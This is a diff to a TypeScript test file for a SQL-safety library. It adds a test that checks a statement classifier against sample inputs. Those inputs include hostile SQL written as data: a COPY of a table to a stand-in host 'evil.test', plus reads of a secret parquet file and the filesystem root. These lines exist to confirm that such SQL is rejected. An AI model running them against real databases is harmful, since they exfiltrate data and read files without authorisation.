@@ -1,6 +1,6 @@
 import fc from 'fast-check';
 import { describe, expect, it } from 'vitest';
-import { ident, lit, validateReadOnlySql } from './index';
+import { classifySqlStatement, ident, lit, validateReadOnlySql } from './index';
 
 describe('@dewpond/sqlkit', () => {
   it('quotes hostile identifiers and unicode safely', () => {
@@ -62,5 +62,20 @@ describe('@dewpond/sqlkit', () => {
       const res = validateReadOnlySql(q);
       expect(res.ok, `Expected rejection for: ${q}`).toBe(false);
     }
+  });
+
+  it('classifies hostile external IO vs DDL vs valid read-only SQL', () => {
+    expect(classifySqlStatement('WITH c AS (SELECT 1 AS a) SELECT * FROM c').kind).toBe(
+      'read_only',
+    );
+    expect(classifySqlStatement("COPY t TO 'https://evil.test/exfil.csv'").kind).toBe(
+      'external_io',
+    );
+    expect(classifySqlStatement("SELECT * FROM read_parquet('opfs://secret.parquet')").kind).toBe(
+      'external_io',
+    );
+    expect(classifySqlStatement("SELECT * FROM glob('/*')").kind).toBe('external_io');
+    expect(classifySqlStatement('CREATE TABLE evil AS SELECT 1').kind).toBe('ddl_or_dml');
+    expect(classifySqlStatement("SELECT 'ok'\0").kind).toBe('invalid');
   });
 });
